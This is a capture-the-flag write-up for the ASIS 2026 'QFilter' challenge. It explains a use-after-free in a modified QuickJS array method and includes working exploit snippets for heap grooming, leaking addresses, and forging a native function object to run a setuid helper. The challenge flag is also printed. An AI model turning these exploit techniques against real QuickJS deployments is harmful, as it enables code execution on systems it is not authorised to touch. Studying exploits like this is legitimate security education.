# QFilter

## Challenge Information

| Field | Value |
| --- | --- |
| Event | ASIS CTF Quals 2026 |
| Category | Binary Exploitation |
| Challenge | QFilter |
| Description | Need a custom Filter? Please be my guest. |
| Service | `nc 65.109.208.46 1337` |
| JavaScript payload | [`exploit.js`](exploit.js) |
| Network launcher | [`solve.py`](solve.py) |
| Original handout | [`artifacts/QFilter_c9b8d86ebc59fcd1d7b9bf68ce3d9cb7b0f0f476.txz`](artifacts/QFilter_c9b8d86ebc59fcd1d7b9bf68ce3d9cb7b0f0f476.txz) |
| Flag | `ASIS{m337_7h3_br4nd_n3w_QJS_4ll0c470r_334811b53075}` |

## Executive Summary

The service executes attacker-supplied JavaScript with a modified QuickJS-ng
0.16.2 interpreter. Its custom `Array.prototype.customFilter()` implementation
tries to optimize reference handling based only on the first array element.
When element zero is a primitive, the function skips `JS_DupValue()` for every
element, but it still calls `JS_FreeValue()` on each copied value. An array of
the form `[0, victim]` therefore frees `victim` while the array retains a stale
tagged pointer to it.

The exploit uses this use-after-free twice:

1. Free a 24-character dynamic string.
2. Reclaim its allocator slot with a lazily created native function object.
3. Read that object through the stale string to leak a `JSContext *` and the
   address of `js_array_buffer_slice()`.
4. Derive the PIE base and the private `js_os_exec()` address.
5. Free a JavaScript function object.
6. Reclaim it with a resized `ArrayBuffer` backing store and write a forged
   `JS_CLASS_C_FUNCTION` object.
7. Call the stale function reference, which dispatches to `js_os_exec()` with
   `['/readflag']`.

The `/readflag` helper is setuid root, so it can read `/flag.txt` even though
the runner drops to the unprivileged `pwn` user before launching QuickJS.

## Included Files

| File | Purpose | SHA-256 |
| --- | --- | --- |
| [`artifacts/QFilter_c9b8d86ebc59fcd1d7b9bf68ce3d9cb7b0f0f476.txz`](artifacts/QFilter_c9b8d86ebc59fcd1d7b9bf68ce3d9cb7b0f0f476.txz) | Untouched challenge handout | `6199567f4c0c886bd293e4a17eb8ca792b07a3e50b60929ddd303c7377e73edc` |
| [`exploit.js`](exploit.js) | QuickJS UAF and native-function forgery payload | `e7e5b2eb10dc5afaa651eef63fc034fac322a81c10e1c4adcf9812143fe92041` |
| [`solve.py`](solve.py) | Dependency-free remote submission client | `0943f3a52f452d4179cc38b3a6118d6d0c5308edf5048a75bea18d18c47b46f1` |

## 1. Inspecting the Handout

The archive contains the service wrapper, Docker configuration, QuickJS
binary, setuid helper, and a local placeholder flag:

```console
$ tar -tJf artifacts/QFilter_c9b8d86ebc59fcd1d7b9bf68ce3d9cb7b0f0f476.txz
QFilter/
QFilter/Dockerfile
QFilter/flag.txt
QFilter/stuff/
QFilter/stuff/run.py
QFilter/stuff/readflag
QFilter/stuff/qjs
QFilter/docker-compose.yml
```

The interpreter is especially friendly to analysis:

```console
$ file QFilter/stuff/qjs
QFilter/stuff/qjs: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
with debug_info, not stripped
```

It is a PIE and uses stack canaries, NX, and control-flow protection. Those
protections do not obstruct this exploit because the attack corrupts a
QuickJS object and redirects an existing native function call rather than
overwriting a return address or injecting native code.

The runner applies the important service constraints:

```python
signal.alarm(10)
os.setgid(1001)
os.setuid(1001)

with tempfile.NamedTemporaryFile() as tmp:
    # Read JavaScript until a line containing -- EOF --.
    ...
    os.system('timeout 3 ./qjs ' + tmp.name)
```

The input is limited to 1 MiB, execution is limited to three seconds, and each
IP receives one attempt every five seconds. The exploit is a small, single-run
JavaScript program and comfortably fits all three limits.

The Dockerfile explains the privilege target:

```dockerfile
RUN chmod 550 /flag.txt
RUN chmod 555 /readflag
RUN chmod u+s /readflag
```

Directly reading `/flag.txt` as UID 1001 fails. Executing `/readflag` is the
intended post-exploitation goal.

## 2. Locating the Custom Native Method

The unstripped symbol table reveals both the modified method and useful native
targets:

```console
$ nm -an QFilter/stuff/qjs | grep -E \
  'js_array_customFilter|js_array_buffer_slice|js_os_exec'
0000000000020438 t js_os_exec
00000000000b034d t js_array_customFilter
00000000000e9cae t js_array_buffer_slice
```

The significant per-binary offsets are therefore:

```text
js_os_exec              0x20438
js_array_customFilter   0xb034d
js_array_buffer_slice   0xe9cae
```

`js_os_exec()` belongs to QuickJS's libc support. It is linked into the
binary, although the runner does not expose an `os` global to submitted
scripts. The later object forgery calls this private function directly.

## 3. Reversing `customFilter()`

QuickJS stores each fast-array element as a 16-byte `JSValue`. The relevant
disassembly first obtains the fast-array storage and tests only the tag of
element zero:

```text
b0454  mov rax, [rax+0x38]      ; p->u.array.values
b0460  mov eax, [rax+0x8]       ; tag of values[0]
b0464  cmp eax, -1              ; JS_TAG_OBJECT
b0469  mov byte [rbp-0x79], 1   ; duplicate elements when true
```

The loop then copies each `JSValue`. `JS_DupValue()` is conditional on the
single boolean computed above, but `JS_FreeValue()` is unconditional:

```text
b0499  cmp byte [rbp-0x79], 0
b049d  je  b04b9
b04b4  call JS_DupValue
...
b0502  call JS_Call
...
b0528  call JS_FreeValue
```

In simplified C-like pseudocode, the bug is:

```c
bool duplicate = JS_VALUE_GET_TAG(values[0]) == JS_TAG_OBJECT;

for (uint32_t i = 0; i < length; i++) {
    JSValue value = values[i];
    if (duplicate)
        JS_DupValue(ctx, value);

    result = JS_Call(ctx, callback, JS_UNDEFINED, 1, &value);
    JS_FreeValue(ctx, value);
    JS_FreeValue(ctx, result);
}
```

The implementation appears to assume that if the first element is not an
object, no later element needs reference counting. JavaScript arrays are
heterogeneous, so that assumption is invalid. For this array:

```javascript
const slots = [0, victim];
slots.customFilter(() => 0);
```

`duplicate` is false because `slots[0]` is an integer. When the loop reaches
`victim`, no reference is added, but `JS_FreeValue()` removes the array's only
reference. The object is destroyed while `slots[1]` still contains its old
tag and pointer.

This gives a repeatable dangling `JSValue` with a type tag chosen before the
free: a stale string for disclosure or a stale object for function forgery.

## 4. Matching the Allocator Size Class

The challenge uses QuickJS-ng's small-object arena allocator. A debugger shows
that both of the objects required by the exploit land in the same 80-byte
allocation class:

| Allocation | Requested body/data | Allocator class |
| --- | ---: | ---: |
| `JSObject` for a C function | 72 bytes | 80 bytes |
| Dynamic 24-byte narrow string | 40-byte header + 25 data bytes | 80 bytes |
| Resized `ArrayBuffer` backing store | 72 bytes | 80 bytes |

The extra byte in the string allocation is the terminating NUL. The small
allocator metadata and alignment bring these requests into the same class.

Sixty-four live `{}` objects are allocated after each victim. This fills the
victim's arena (50 slots were observed in GDB), preventing a later allocation
from being served from an untouched slot in the same arena. Once the victim is
freed, it becomes the allocator's immediate reusable slot. The spray arrays are
kept alive for the entire exploit.

## 5. Turning a Stale String into an ASLR Leak

First create a dynamic 24-character string and leave the array as its only
owner:

```javascript
let text = "L".repeat(24);
const leakSlots = [0, text];
text = null;

const leakSpray = [];
for (let i = 0; i < 64; i++)
    leakSpray.push({});

leakSlots.customFilter(() => 0);
```

At this point `leakSlots[1]` is still tagged as a string, but its allocation
has been freed.

QuickJS installs many built-in methods lazily. The first lookup of the uncommon
`ArrayBuffer.prototype.sliceToImmutable` property creates a native C-function
object. It is also an 80-byte allocation, so it reuses the freed string slot:

```javascript
const leakedNativeFunction = ArrayBuffer.prototype.sliceToImmutable;
const staleText = leakSlots[1];
```

The relevant 64-bit `JSObject` offsets for `JS_CLASS_C_FUNCTION` are:

```text
+0x12  uint16_t class_id
+0x30  JSContext *realm
+0x38  JSCFunctionType c_function
+0x40  uint8_t length
+0x41  uint8_t cproto
```

The old `JSString` data begins 40 bytes into the allocation. Reading character
offset 8 therefore reads object offset `0x30`, and offset 16 reads object offset
`0x38`:

```text
stale string byte  8 -> C-function object +0x30 -> realm/context
stale string byte 16 -> C-function object +0x38 -> native function pointer
```

The reclaimed method points to `js_array_buffer_slice()`. Subtracting its
known static offset recovers the PIE base, after which adding `0x20438` gives
`js_os_exec()`:

```javascript
const binaryBase = sliceFunction - 0xe9caen;
const osExec = binaryBase + 0x20438n;
```

The exploit rejects the leak unless the context looks canonical and the
calculated PIE base is page aligned.

### Handling Narrow and Wide String Interpretation

After reclamation, the old string header contains `JSObject` fields. The bit
that QuickJS interprets as `JSString.is_wide_char` comes from an ASLR-dependent
object-list pointer, so it can be either zero or one on different runs.

The exploit detects the mode before decoding pointers:

- In narrow mode, character indexes 4 through 7 read bytes `+0x2c..+0x2f`,
  which belong to a null `first_weak_ref` pointer.
- In wide mode, those indexes read 16-bit words at `+0x30..+0x37`, which hold
  the nonzero context pointer.

`readU64FromString()` then reconstructs a pointer from either eight 8-bit
characters or four 16-bit characters. Accounting for both layouts removed an
ASLR-dependent failure mode and made the leak stable across fresh processes.

## 6. Preparing a Controlled Reallocation

Before triggering the second UAF, the exploit resolves the lazy methods it
will need later:

```javascript
const resizeMethod = ArrayBuffer.prototype.resize;
const fillMethod = Uint8Array.prototype.fill;
```

Without this prewarming, the first post-free access to one of these methods
could allocate another native function and consume the desired slot.

Next, create a resizable one-byte buffer with a 72-byte maximum and a
length-tracking view:

```javascript
const fakeBuffer = new ArrayBuffer(1, {maxByteLength: 72});
const fakeView = new Uint8Array(fakeBuffer);
```

Calling `fakeBuffer.resize(72)` later requests a 72-byte backing store. That
allocation belongs to the same 80-byte class as a freed `JSObject`, and every
byte is writable through `fakeView`.

## 7. Forging a Native Function Object

Create an ordinary JavaScript function, retain it only in a mixed array, fill
its allocator arena, and trigger the UAF again:

```javascript
let targetFunction = () => 0;
const functionSlots = [0, targetFunction];
targetFunction = null;

const functionSpray = [];
for (let i = 0; i < 64; i++)
    functionSpray.push({});

functionSlots.customFilter(() => 0);
```

`functionSlots[1]` remains tagged as an object and points to the freed
72-byte `JSObject`. Resizing the prepared buffer immediately reclaims that
allocation:

```javascript
fakeBuffer.resize(72);
const fakeFunction = functionSlots[1];
```

The length-tracking view now covers all 72 bytes. Clear the allocation and
populate only the fields needed by QuickJS's native-call dispatcher:

```javascript
fakeView.fill(0);
writeU32(fakeView, 18, 12);       // JS_CLASS_C_FUNCTION
writeU64(fakeView, 48, context);  // valid JSContext *realm
writeU64(fakeView, 56, osExec);   // c_function.generic
fakeView[64] = 1;                 // native argument count
fakeView[65] = 0;                 // JS_CFUNC_generic
```

Class ID 12 is `JS_CLASS_C_FUNCTION`. When `fakeFunction` is invoked,
`js_call_c_function()` reads the forged realm, function pointer, length, and
calling convention. With `cproto` set to `JS_CFUNC_generic`, it executes:

```c
ret_val = func.generic(ctx, this_obj, argc, arg_buf);
```

The forged target is therefore called with the same ABI that
`js_os_exec()` expects.

## 8. Executing the Setuid Helper

`js_os_exec()` expects its first JavaScript argument to be an array containing
the executable and its arguments. The final call is:

```javascript
fakeFunction(["/readflag"]);
```

QuickJS starts `/readflag`; the kernel honors its setuid bit, and the helper
prints the protected flag. The corrupted runtime may abort during teardown
because the forged object is not a valid member of its GC lists. This occurs
only after the helper has returned and the flag has already been printed, so
it does not affect exploitation.

## 9. Running the Solver

The launcher uses only Python's standard library. It reads `exploit.js`, waits
for the service prompt, appends the required terminator, and relays all output.

```console
$ python3 solve.py
Send you script: ( + append "\n-- EOF --\n"):
[+] context: 0x5573721f8528
[+] PIE base: 0x557349c68000
[+] js_os_exec: 0x557349c88438
ASIS{m337_7h3_br4nd_n3w_QJS_4ll0c470r_334811b53075}
```

An alternate host and port can be supplied positionally:

```console
$ python3 solve.py HOST PORT
```

## 10. Local Reproduction

Extract and build the supplied container:

```console
$ mkdir -p /tmp/qfilter-handout
$ tar -xJf artifacts/QFilter_c9b8d86ebc59fcd1d7b9bf68ce3d9cb7b0f0f476.txz \
    -C /tmp/qfilter-handout
$ docker build --platform linux/amd64 -t qfilter-local \
    /tmp/qfilter-handout/QFilter
$ docker run --rm --platform linux/amd64 -p 31338:1337 qfilter-local
```

From a second terminal, point the same launcher at the local service:

```console
$ python3 solve.py 127.0.0.1 31338
...
ASIS{^test-flag^}
```

The final payload was tested against the exact Docker service and across 20
fresh interpreter processes with randomized addresses. All 20 runs recovered
the local placeholder flag.

## Flag

```text
ASIS{m337_7h3_br4nd_n3w_QJS_4ll0c470r_334811b53075}
```

Use these materials only in authorized CTF and educational environments.
